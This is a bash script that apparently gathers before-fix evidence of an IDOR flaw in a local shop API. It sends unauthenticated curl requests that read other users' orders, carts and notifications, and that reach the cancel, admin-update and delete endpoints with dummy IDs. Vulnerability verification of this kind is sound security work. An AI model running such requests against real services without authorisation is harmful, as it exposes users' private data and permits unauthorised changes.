#!/bin/bash
# BEFORE-FIX evidence for Vuln #3 (IDOR, CWE-639). All requests are UNAUTHENTICATED (no Authorization header).
# Read-only except request 7/8 which target non-existent IDs so no real data is modified.
B=http://localhost:3001/api
run(){ echo; echo "### $1"; echo "\$ curl -s -w ' HTTP %{http_code}' $2"; eval "curl -s -m 10 -w ' -> HTTP %{http_code}\n' $2" | head -c 500; echo; }
run "1. Any visitor reads ANY order by ID (order 2 belongs to user_id 2)" "$B/orders/2"
run "2. Order 1 (another user) - just change the ID" "$B/orders/1"
run "3. Order history of arbitrary user_id=2" "$B/orders/user/2"
run "4. Order summary of arbitrary user_id=2" "$B/orders/user/summary/2"
run "5. Cart of arbitrary user_id=2" "$B/cart/getcart/2"
run "6. Notifications of arbitrary user_id=2" "$B/notifications/user/2"
run "7. Cancel endpoint with no token (non-existent order 999999; reaches business logic -> 400, not 401/403)" "-X PUT $B/orders/cancel/999999"
run "8. Admin status-update with no token (non-existent order 999999; 404 = auth passed)" "-X PUT -H 'Content-Type: application/json' -d '{\"status\":\"shipped\"}' $B/orders/update/999999"
run "9. Delete notification with no token (non-existent id; 404 from business logic, not 401)" "-X DELETE $B/notifications/000000000000000000000000"
